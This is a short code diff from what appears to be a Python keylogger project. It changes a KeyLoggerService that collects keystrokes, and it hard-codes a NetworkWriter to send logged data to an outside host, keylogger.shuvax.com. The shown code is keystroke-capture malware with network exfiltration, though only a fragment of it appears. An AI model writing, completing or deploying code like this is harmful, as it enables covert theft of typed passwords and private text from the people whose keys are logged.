@@ -25,13 +25,9 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        # if len(self.__logged_keys)<1:
-        #     return {}
-        # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
         return self.__logged_keys
 
     def clear_logged_keys(self) -> dict[str:str]:
-        # self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
         self.__logged_keys = {}
 
 class FileWriter(Write):
@@ -59,8 +55,8 @@ class FileWriter(Write):
             return False
 
 class NetworkWriter(Write):
-    def __init__(self,url=None):
-        self.url = url or "https://keylogger.shuvax.com"
+    def __init__(self):
+        self.url =  "https://keylogger.shuvax.com"
     def write(self, serial_number, data:dict[str:str]) -> bool:
         if not data:
             return True
